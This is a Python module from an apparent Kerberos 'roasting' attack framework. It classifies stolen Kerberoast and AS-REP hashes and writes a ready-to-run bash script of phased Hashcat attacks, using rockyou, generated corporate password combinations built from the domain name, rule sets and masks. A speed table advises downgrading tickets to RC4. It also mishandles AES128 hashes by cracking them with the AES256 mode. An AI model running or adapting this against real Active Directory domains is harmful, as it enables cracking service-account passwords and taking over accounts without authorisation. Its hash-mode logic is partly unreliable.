"""
Cracking Manager — Phase 3 of the Roasting Framework.

Classifies extracted hashes by type, generates optimized
Hashcat cracking scripts, and prints speed reference tables.
"""

import os
from datetime import datetime
from pathlib import Path
from typing import List


class CrackingManager:
    """Classify hashes and generate cracking strategy scripts."""

    def __init__(self, domain: str, output_dir: Path):
        self.domain = domain
        self.output_dir = output_dir

    def prepare(self, hashes: List[str]):
        """Write categorized hash files and generate cracking script."""
        print(f"\n{'=' * 60}")
        print("PHASE 3: CRACKING PREPARATION")
        print(f"{'=' * 60}")

        # Write combined hash file
        all_file = self.output_dir / "all_hashes.txt"
        all_file.write_text("\n".join(hashes) + "\n")
        print(f"[+] All hashes: {all_file}")

        # Classify
        kerb_rc4 = [h for h in hashes if "$krb5tgs$23$" in h]
        kerb_aes = [h for h in hashes if "$krb5tgs$17$" in h or "$krb5tgs$18$" in h]
        asrep = [h for h in hashes if "$krb5asrep$" in h]

        self._write_category("kerberoast_rc4.txt", kerb_rc4)
        self._write_category("kerberoast_aes.txt", kerb_aes)
        self._write_category("asrep_hashes_only.txt", asrep)

        print(f"    RC4 Kerberoast hashes: {len(kerb_rc4)} (Hashcat mode 13100)")
        print(f"    AES Kerberoast hashes: {len(kerb_aes)} (Hashcat mode 19700)")
        print(f"    AS-REP hashes:         {len(asrep)} (Hashcat mode 18200)")

        self._generate_strategy_script()
        self._print_speed_reference()

    def _write_category(self, filename: str, hashes: List[str]):
        if hashes:
            (self.output_dir / filename).write_text("\n".join(hashes) + "\n")

    def _generate_strategy_script(self):
        """Write a phased Hashcat cracking shell script."""
        domain_word = self.domain.split(".")[0].capitalize()
        strategy_file = self.output_dir / "cracking_strategy.sh"

        strategy = f"""#!/bin/bash
# Roasting Hash Cracking Strategy — {self.domain}
# Generated: {datetime.now().isoformat()}

HASH_DIR="{self.output_dir}"

echo "[*] Phase A: Quick wins — rockyou straight..."
hashcat -m 13100 "$HASH_DIR/kerberoast_rc4.txt" /usr/share/wordlists/rockyou.txt -O 2>/dev/null
hashcat -m 18200 "$HASH_DIR/asrep_hashes_only.txt" /usr/share/wordlists/rockyou.txt -O 2>/dev/null

echo "[*] Phase B: Corporate wordlist + combos..."
for year in $(seq 2019 2026); do
    for word in Password Welcome {domain_word} Summer Winter Spring Fall Admin Service; do
        echo "${{word}}${{year}}"; echo "${{word}}${{year}}!"
        echo "${{word}}@${{year}}"; echo "${{word}}#${{year}}"
    done
done > "$HASH_DIR/corporate_combos.txt"

hashcat -m 13100 "$HASH_DIR/kerberoast_rc4.txt" "$HASH_DIR/corporate_combos.txt" -O 2>/dev/null
hashcat -m 18200 "$HASH_DIR/asrep_hashes_only.txt" "$HASH_DIR/corporate_combos.txt" -O 2>/dev/null

echo "[*] Phase C: rockyou + best64 rules..."
hashcat -m 13100 "$HASH_DIR/kerberoast_rc4.txt" /usr/share/wordlists/rockyou.txt \\
    -r /usr/share/hashcat/rules/best64.rule -O 2>/dev/null

echo "[*] Phase D: rockyou + OneRuleToRuleThemAll..."
hashcat -m 13100 "$HASH_DIR/kerberoast_rc4.txt" /usr/share/wordlists/rockyou.txt \\
    -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule -O 2>/dev/null

echo "[*] Phase E: Mask attacks for common patterns..."
hashcat -m 13100 "$HASH_DIR/kerberoast_rc4.txt" -a 3 '?u?l?l?l?l?l?d?d?s' -O 2>/dev/null

echo "[*] Phase F: AES hashes (slow — run overnight)..."
hashcat -m 19700 "$HASH_DIR/kerberoast_aes.txt" /usr/share/wordlists/rockyou.txt -O 2>/dev/null

echo "[*] Results:"
hashcat -m 13100 "$HASH_DIR/kerberoast_rc4.txt" --show 2>/dev/null
hashcat -m 18200 "$HASH_DIR/asrep_hashes_only.txt" --show 2>/dev/null
hashcat -m 19700 "$HASH_DIR/kerberoast_aes.txt" --show 2>/dev/null
"""
        strategy_file.write_text(strategy)
        os.chmod(strategy_file, 0o755)

        print(f"\n[+] Cracking strategy: {strategy_file}")
        print(f"[+] Run: bash {strategy_file}")

    @staticmethod
    def _print_speed_reference():
        print("""
╔══════════════════════════════════════════════════════════════╗
║                  CRACKING SPEED REFERENCE                    ║
╠══════════════════════════════════════════════════════════════╣
║  Hash Type          │ Hashcat Mode │ RTX 4090 Speed          ║
║  ──────────────────────────────────────────────────────────  ║
║  Kerberoast (RC4)   │ 13100        │ ~60 GH/s (fast!)       ║
║  AS-REP (RC4)       │ 18200        │ ~50 GH/s (fast!)       ║
║  Kerberoast (AES128)│ 19600        │ ~150 MH/s (slow)       ║
║  Kerberoast (AES256)│ 19700        │ ~75 MH/s (very slow)   ║
╠══════════════════════════════════════════════════════════════╣
║  RC4 is ~400x faster to crack than AES256                    ║
║  Always try to downgrade to RC4 when possible (tgtdeleg)     ║
╚══════════════════════════════════════════════════════════════╝
""")